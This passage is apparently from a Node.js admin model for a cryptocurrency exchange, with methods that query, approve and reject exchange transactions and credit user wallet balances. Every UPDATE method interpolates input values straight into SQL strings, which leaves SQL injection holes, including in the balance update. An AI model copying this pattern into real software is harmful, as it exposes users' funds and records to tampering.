    let sql = `SELECT et.* , r.email , c.name as coin_name , c.symbol , trx.trx_type_name FROM exchange_transaction as et inner join registration as r on r.id = et.user_id inner join coins as c on c.id = et.coin_id inner join trx_type as trx on trx.id = et.trx_type where et.trx_type = 4 order by et.id desc`;
    const [result, fields] = await promisePool.query(sql);

    return result;
  }

   updateexchangetransaction = async (data) => {
    let sql = `UPDATE exchange_transaction SET status = 1 , hash = '${data.hash}' WHERE id = '${data.id.id}'`;
    const [result, fields] = await promisePool.query(sql);
    return result;
  }

   rejectexchangetransaction = async (data) => {
    let sql = `UPDATE exchange_transaction SET status = 2 WHERE id = '${data.id}'`;
    const [result, fields] = await promisePool.query(sql);
    return result.affectedRows;
  }

  updateuserwallet = async (data) => {
    let sql = `UPDATE user_wallet SET Balance = Balance+'${data.amount}' WHERE user_id = '${data.user_id}' And coin_id = '${data.coin_id}' `;
    const [result, fields] = await promisePool.query(sql);
    return result.affectedRows;
  }
}
module.exports = new AdminModel;
